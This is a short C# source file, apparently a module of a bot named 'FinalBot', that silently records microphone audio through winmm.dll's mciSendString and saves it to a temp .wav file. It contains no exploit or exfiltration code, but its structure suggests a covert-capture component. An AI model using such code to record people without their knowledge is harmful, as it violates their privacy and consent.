using System;
using System.Runtime.InteropServices;
using System.IO;

namespace FinalBot.Modules
{
    public static class AudioModule
    {
        [DllImport("winmm.dll")]
        private static extern int mciSendString(string command, string? buffer, int bufferSize, IntPtr hwndCallback);

        public static string? RecordAudio(int durationSeconds)
        {
            string tempFile = Path.Combine(Path.GetTempPath(), $"aud_{Environment.TickCount}.wav");
            try
            {
                mciSendString("open new Type waveaudio Alias recsound", null, 0, IntPtr.Zero);
                mciSendString("record recsound", null, 0, IntPtr.Zero);
                
                System.Threading.Thread.Sleep(durationSeconds * 1000);
                
                mciSendString($"save recsound {tempFile}", null, 0, IntPtr.Zero);
                mciSendString("close recsound", null, 0, IntPtr.Zero);

                if (File.Exists(tempFile) && new FileInfo(tempFile).Length > 100)
                {
                    return tempFile;
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Audio recording failed", ex);
            }
            return null;
        }
    }
}
